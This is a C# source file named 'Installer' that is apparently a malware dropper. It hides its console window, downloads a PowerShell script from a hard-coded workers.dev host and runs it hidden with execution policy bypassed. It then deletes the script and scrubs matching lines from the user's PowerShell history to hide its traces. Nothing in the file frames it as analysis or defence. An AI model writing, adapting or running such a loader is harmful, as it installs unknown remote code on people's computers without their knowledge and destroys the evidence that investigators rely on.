using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

class Installer
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    static void Main(string[] args)
    {
        // Hide console window instantly
        try { ShowWindow(GetConsoleWindow(), 0); } catch {}

        string url = "https://sweetbush.rr3703404.workers.dev/install.ps1";

        // Allow custom URL via argument
        if (args.Length > 0 && args[0].StartsWith("http"))
            url = args[0];

        string tmpPs1 = Path.Combine(Path.GetTempPath(), "t_" + new Random().Next(100000, 999999) + ".ps1");

        try
        {
            // Download install.ps1
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            using (var wc = new WebClient())
            {
                wc.DownloadFile(url, tmpPs1);
            }

            // Run PowerShell completely hidden
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + tmpPs1 + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };
            var proc = Process.Start(psi);
            proc.WaitForExit(600000); // 10 min max
        }
        catch {}
        finally
        {
            // Clean up
            try { File.Delete(tmpPs1); } catch {}

            // Clean PowerShell history
            try
            {
                string histPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "PowerShell", "PSReadLine",
                    "ConsoleHost_history.txt");
                if (File.Exists(histPath))
                {
                    var lines = File.ReadAllLines(histPath);
                    using (var sw = new StreamWriter(histPath))
                    {
                        foreach (var line in lines)
                        {
                            if (line.IndexOf("workers.dev", StringComparison.OrdinalIgnoreCase) >= 0) continue;
                            if (line.IndexOf("install.ps1", StringComparison.OrdinalIgnoreCase) >= 0) continue;
                            if (line.IndexOf("sweetbush", StringComparison.OrdinalIgnoreCase) >= 0) continue;
                            if (line.IndexOf("rr3703404", StringComparison.OrdinalIgnoreCase) >= 0) continue;
                            if (line.IndexOf("hyperlinken", StringComparison.OrdinalIgnoreCase) >= 0) continue;
                            if (line.IndexOf("techno", StringComparison.OrdinalIgnoreCase) >= 0) continue;
                            sw.WriteLine(line);
                        }
                    }
                }
            }
            catch {}
        }
    }
}
